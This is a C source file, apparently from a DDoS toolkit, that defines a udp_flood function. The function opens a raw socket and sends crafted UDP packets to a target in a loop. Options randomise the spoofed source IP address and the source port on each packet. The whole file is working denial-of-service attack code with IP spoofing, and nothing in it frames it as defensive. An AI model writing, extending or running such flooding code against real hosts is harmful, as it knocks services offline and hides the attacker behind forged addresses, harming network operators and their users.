#include "common.h"

struct udp_payload {
    struct ip ip;
    struct udphdr udp;
    unsigned char data[0];
};

void udp_flood(struct in_addr src, ushort srcport, struct in_addr dst, ushort dstport, void *data, size_t datalen, void (*dataupdater)(void *), struct ddos_flags flags, unsigned long long maxcount)
{
    struct udp_payload *ppayload = malloc(sizeof(struct udp_payload) + datalen);
    #define payload (*ppayload)
    
    int fd = ip_rawsocket();
    struct sockaddr_in sockdst;
    ip_mksaddr(&sockdst, dst);
    
    ip_init(&payload.ip, IPPROTO_UDP);
    ip_setsrc(&payload.ip, src);
    ip_setdst(&payload.ip, dst);
    
    memcpy(payload.data, data, datalen);
    
    struct counter cnt;
    counter_reset(&cnt, "packets");
    
    while (counter_less(&cnt, maxcount)) {
        if (flags.ip_spoof) payload.ip.ip_src.s_addr = rand_u32();
        if (flags.rand_sport) srcport = rand_port();
        ip_setid(&payload.ip, rand_u16());
        
        if (dataupdater) dataupdater(payload.data);
        ushort udp_size = 8 + datalen;
        payload.udp = (struct udphdr) {
            .uh_sport = htons(srcport),
            .uh_dport = htons(dstport),
            .uh_ulen = htons(udp_size),
            .uh_sum = 0,
        };
        ip_resize(&payload.ip, udp_size);
        ip_cksum(&payload.ip);

        int r = sendto(fd, &payload, ip_size(&payload.ip), 0, (struct sockaddr *) &sockdst, sizeof(sockdst));
        assert(r > 0);
        
        if (counter_less(&cnt, 1)) dump(&payload, ip_size(&payload.ip));
        counter_inc(&cnt);
    }
    
    close(fd);
    free(ppayload);
    #undef payload
}

